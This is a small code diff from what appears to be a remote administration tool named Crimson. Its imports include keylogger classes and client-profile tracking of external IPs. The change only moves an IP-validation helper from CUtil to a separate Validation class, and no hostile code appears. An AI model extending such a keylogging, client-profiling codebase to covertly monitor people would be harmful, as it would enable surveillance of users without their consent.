@@ -41,8 +41,8 @@ import com.subterranean_security.crimson.core.profile.group.GroupAttributeType;
 import com.subterranean_security.crimson.core.proto.Delta.AttributeGroupContainer;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
+import com.subterranean_security.crimson.core.util.Validation;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
-import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.attribute.Attribute;
 import com.subterranean_security.crimson.sv.profile.attribute.UntrackedAttribute;
@@ -208,7 +208,7 @@ public class ClientProfile implements Serializable {
 
 		// location
 		if (ipLocationIcon == null && getAttr(SimpleAttribute.NET_EXTERNALIP) != null) {
-			if (CUtil.Validation.privateIP(getAttr(SimpleAttribute.NET_EXTERNALIP))) {
+			if (Validation.privateIP(getAttr(SimpleAttribute.NET_EXTERNALIP))) {
 				ipLocationIcon = UIUtil.getIcon("icons16/general/localhost.png");
 				ipLocationIcon.setDescription("Private IP");
 			} else {
